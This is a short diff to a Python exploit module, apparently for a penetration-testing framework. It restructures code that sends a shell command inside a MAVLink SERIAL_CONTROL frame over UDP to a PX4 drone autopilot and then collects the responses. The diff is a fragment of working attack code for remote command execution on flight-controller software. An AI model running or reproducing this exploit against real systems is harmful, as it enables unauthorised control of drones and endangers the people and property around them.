@@ -233,6 +233,11 @@ class Exploit(Exploit):
         if not self._validate():
             return
 
+        print_success("Validation passed; launching E2E exploit ...")
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: send SERIAL_CONTROL shell command to PX4 autopilot."""
         target_ip = str(self.target).strip()
         target_port = int(self.port)
         cmd = str(self.command).strip()
@@ -260,7 +265,6 @@ class Exploit(Exploit):
             sock.settimeout(float(timeout_s))
             sock.sendto(frame, (target_ip, target_port))
             print_info("Frame sent. Waiting for SERIAL_CONTROL response...")
-            # Collect responses
             responses = []
             deadline = time.time() + timeout_s
             while time.time() < deadline:
